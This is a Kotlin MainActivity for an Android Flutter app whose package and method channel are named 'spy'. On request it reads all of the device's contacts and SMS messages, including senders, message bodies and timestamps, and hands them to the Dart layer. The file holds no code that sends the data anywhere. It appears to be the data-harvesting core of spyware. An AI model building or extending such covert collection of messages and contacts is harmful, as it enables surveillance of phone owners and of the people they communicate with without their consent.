package com.anjesh.spy

import android.database.Cursor
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.Telephony
import io.flutter.embedding.android.FlutterActivity
import io.flutter.plugin.common.MethodChannel

class MainActivity: FlutterActivity() {
    private val CHANNEL = "com.example.spy/data"

    override fun configureFlutterEngine(flutterEngine: io.flutter.embedding.engine.FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
            when (call.method) {
                "getContactsAndSms" -> {
                    val contacts = getContacts()
                    val smsList = getSms()
                    result.success(mapOf("contacts" to contacts, "sms" to smsList))
                }
                else -> result.notImplemented()
            }
        }
    }

    private fun getContacts(): List<Map<String, String>> {
        val list = mutableListOf<Map<String, String>>()
        val cursor: Cursor? = contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null
        )

        cursor?.use {
            while (it.moveToNext()) {
                val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val phone = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                list.add(mapOf("name" to name, "phone" to phone))
            }
        }

        return list
    }

    private fun getSms(): List<Map<String, String>> {
        val list = mutableListOf<Map<String, String>>()
        val cursor: Cursor? = contentResolver.query(
            Telephony.Sms.CONTENT_URI, null, null, null,
            Telephony.Sms.DEFAULT_SORT_ORDER
        )

        cursor?.use {
            while (it.moveToNext()) {
                val address = it.getString(it.getColumnIndexOrThrow("address")) ?: ""
                val body = it.getString(it.getColumnIndexOrThrow("body")) ?: ""
                val date = it.getString(it.getColumnIndexOrThrow("date")) ?: ""
                list.add(mapOf("address" to address, "body" to body, "timestamp" to date))
            }
        }

        return list
    }
}

